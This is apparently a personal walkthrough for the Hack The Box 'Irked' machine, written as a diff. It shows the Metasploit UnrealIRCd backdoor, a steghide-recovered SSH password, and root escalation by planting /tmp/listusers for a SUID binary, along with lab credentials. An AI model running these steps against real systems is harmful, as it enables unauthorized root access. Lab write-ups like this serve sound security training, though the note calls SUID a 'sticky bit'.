@@ -1,0 +1,97 @@
+#####################
+# Sources and Links #
+#####################
+https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/
+
+#########
+# TL,DR #
+#########
+Metasploit gives an IRC backdoor
+There is a hidden password for a steg file that gives SSH credentials for user
+SSH as djmardov gives user.txt
+
+Sticky bit search shows a program that can be exploited to cat root.txt
+
+########
+# Hack #
+########
+Nmap scan report for 10.10.10.117
+Host is up (0.095s latency).
+Not shown: 58637 closed ports, 6892 filtered ports
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+111/tcp   open  rpcbind
+8067/tcp  open  infi-async
+44474/tcp open  unknown
+65534/tcp open  unknown
+
+msf5 > search unrealIRCd
+
+Matching Modules
+================
+
+   #  Name                                        Disclosure Date  Rank       Check  Description
+   -  ----                                        ---------------  ----       -----  -----------
+   0  exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12       excellent  No     UnrealIRCD 3.2.8.1 Backdoor Command Execution
+
+Setting RHOSTS and RPORT gets us a shell!
+RHOSTS:10.10.10.117
+RPORT:6697
+
+There is a user djmardov, but user.txt in Documents says Permission denied
+There is a hidden .backup file
+
+Super elite steg backup pw
+UPupDOWNdownLRlrBAbaSSss
+
+This password corresponds to the irked.jpg at 10.10.10.117
+ryann@kali:~/HackTheBox/Irked_117$ steghide extract -sf irked.jpg
+Enter passphrase:
+wrote extracted data to "pass.txt".
+ryan@kali:~/HackTheBox/Irked_117$ cat pass.txt
+Kab6h+m+bbp2J:HG
+
+We can now ssh into the server as djmardov with the supplied password
+We can cat /home/djmardov/Documents/user.txt
+
+djmardov@irked:~/Documents$ wc user.txt
+ 1  1 33 user.txt
+REDACTED FOR WALKTHROUGH
+
+
+Now to escalate privleges...
+Looking for sticky bits shows an interesting utility
+find / -perm -u=s -type f 2>/dev/null
+/usr/bin/viewuser
+
+djmardov@irked:~$ viewuser -h
+This application is being devleoped to set and test user permissions
+It is still being actively developed
+(unknown) :0           2020-02-08 23:12 (:0)
+djmardov pts/0        2020-02-08 23:41 (10.10.14.2)
+sh: 1: /tmp/listusers: not found
+
+We can create /tmp/listusers and edit the file to have 777 permissions.
+When we run the file, whatever it contains will be executed as root
+Edit listusers:
+cat /root/root.txt
+
+Now, executing viewuser -h gives us the root password!
+
+djmardov@irked:/tmp$ chmod 777 listusers 
+djmardov@irked:/tmp$ viewuser -h
+This application is being devleoped to set and test user permissions
+It is still being actively developed
+(unknown) :0           2020-02-08 23:12 (:0)
+djmardov pts/0        2020-02-08 23:41 (10.10.14.2)
+ 1  1 33 /root/root.txt
+REDACTED FOR WALKTHROUGH
+
+
+###########
+# Learned #
+###########
+Sticky bit search and how it is useful!
+find / -perm -u=s -type f 2>/dev/null
+
